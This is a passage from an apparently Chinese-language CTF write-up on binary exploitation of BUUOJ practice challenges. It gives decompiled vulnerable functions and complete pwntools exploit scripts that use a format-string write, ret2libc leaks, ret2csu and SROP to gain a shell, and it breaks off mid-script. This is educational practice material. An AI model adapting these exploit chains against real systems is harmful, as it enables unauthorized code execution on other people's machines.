title="jarvisoj_fm"></a>jarvisoj_fm</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);                                  <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的格式化字符串漏洞，思路有很多，这里由于没有开启pie，所以可以将<code>x</code>处的值写成<code>4</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  jarvisoj_fm ./fm</span><br><span class="line">aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">aaaa-0xffb5db9c-0x50-0xf7ee35ec-0xf7f2a942-0xf7fc7c30-(nil)-0xffb5dc94-(nil)-(nil)-0x2f-0x61616161-0x2d70252d-0x252d7025-0x70252d70</span><br><span class="line">3!</span><br></pre></td></tr></table></figure><p>可以看到我们输入的参数在第11个</p><h4 id="EXP-18"><a href="#EXP-18" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fm&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27208&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">x = <span class="number">0x804A02C</span></span><br><span class="line">payload = p32(x) + <span class="string">b&quot;%11$n&quot;</span></span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> a2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">  get_n(nptr, <span class="number">4u</span>);</span><br><span class="line">  a2 = atoi(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)a2 &lt;= <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, a2);</span><br><span class="line">    get_n(nptr, a2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>atoi</code>函数会返回一个unsigned int值，但v2为int类型，因此输入负数也可以过<code>v2 &gt; 32</code>的检查，那么就会导致下面<code>get_n</code>栈溢出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  pwn2_sctf_2016 ./pwn2_sctf_2016 </span><br><span class="line">How many bytes do you want me to read? -1</span><br><span class="line">Ok, sounds good. Give me 4294967295 bytes of data!</span><br></pre></td></tr></table></figure><p>那么就可以通过栈溢出来泄露libc版本和地址，来算出<code>system</code>和<code>/bin/sh</code>的地址</p><h4 id="EXP-19"><a href="#EXP-19" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27713&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Ok, sounds good. Give me 4294967295 bytes of data!&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">formatstr_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;%s&quot;</span>))</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x2C</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(printf_plt) + p32(main_addr) + p32(formatstr_addr) + p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ru(<span class="string">&quot;You said: &quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.success(<span class="string">f&quot;printf_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)</span><br><span class="line">lib.address = printf_addr - lib.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x2C</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(system_addr) + p32(str_bin_sh)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Ok, sounds good. Give me 4294967295 bytes of data!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>vuln函数存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gadgets函数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105173212597.png" alt="image-20211105173212597"></p><p>本题存在两种思路</p><ul><li>思路1: 通过系统调用59对应的<code>execve</code>， 构造<code>rop</code>链执行<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></li><li>思路2: 通过系统调用15对应的<code>sys_rt_sigreturn</code>, 借助<code>sigreturn frame</code>来执行<code>system(&quot;/bin/sh&quot;)</code></li></ul><h4 id="EXP1-2"><a href="#EXP1-2" class="headerlink" title="EXP1"></a>EXP1</h4><p>由于题目中没有给出<code>/bin/sh</code>， 所以我们需要先写到栈里，并算出来地址，通过调试可知</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211106164516627.png" alt="image-20211106164516627"></p><p><code>0x7ffd310e25d0存放</code>着一处栈地址, 且此处距离<code>/bin/sh\x00</code>的距离为<code>0x00007ffd310e26c8 - 0x7ffd310e25b0 = 0x118</code>, 这个偏移是固定的，则我们就获得了<code>/bin/sh</code>的地址。接着就可以用<code>ret2csu</code>构造攻击链</p><p>根据64位调用约定，我们还需要一个<code>pop rdi</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211106165232884.png" alt="image-20211106165232884"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_3&quot;</span>)</span><br><span class="line"><span class="comment"># p = Remote(&quot;node4.buuoj.cn:28906&quot;)</span></span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x00000000004004ED</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">8</span> + p64(vuln_addr)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x118</span></span><br><span class="line">rv(<span class="number">32</span>)</span><br><span class="line">sh_addr = u64(rv(<span class="number">8</span>)) - offset</span><br><span class="line">log.success(<span class="string">f&quot;sh_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line">execv_addr = <span class="number">0x00000000004004E2</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000400517</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005a3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    csu_front_addr = <span class="number">0x0000000000400580</span></span><br><span class="line">    csu_end_addr = <span class="number">0x000000000040059A</span></span><br><span class="line">    payload += p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">0</span>, sh_addr + <span class="number">0x50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += p64(execv_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(sh_addr) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP2-2"><a href="#EXP2-2" class="headerlink" title="EXP2"></a>EXP2</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_3&quot;</span>)</span><br><span class="line"><span class="comment"># p = Remote()</span></span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x0000000004004DA</span></span><br><span class="line">vuln_addr = <span class="number">0x00000000004004F1</span></span><br><span class="line">system_ret = <span class="number">0x0000000000400517</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">sd(payload)</span><br><span class="line">rv(<span class="number">32</span>)</span><br><span class="line">sh_addr = u64(rv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">rv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = system_call</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + p64(sigreturn) + p64(system_ret) + <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main函数中存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出泄露<code>__libc_start_main</code> 的地址，从而算出<code>libc</code>的基地址，因为 <code>printf</code>需要<code>%s</code>, 所以我们需要<code>pop rdi</code>与<code>pop rsi</code></p><h4 id="EXP-20"><a href="#EXP-20" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyrop2&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29412&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400731</span></span><br><span class="line">format_str = <span class="number">0x0000000000400790</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./babyrop2&quot;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc_start_main_addr = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">lib = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># Debug(p, &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># b *0x00000000004006CB</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(format_str) + p64(pop_rsi_r15_ret) + p64(libc_start_main_addr) + p64(<span class="number">0</span>) + p64(printf_plt) + p64(main_addr)</span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lib.address = __libc_start_main_addr - lib.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>存在栈溢出漏洞，通过泄露地址从而算出libc基址，从而getshell</p><h4 id="EXP-21"><a href="#EXP-21" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> sendfile</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25522&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = 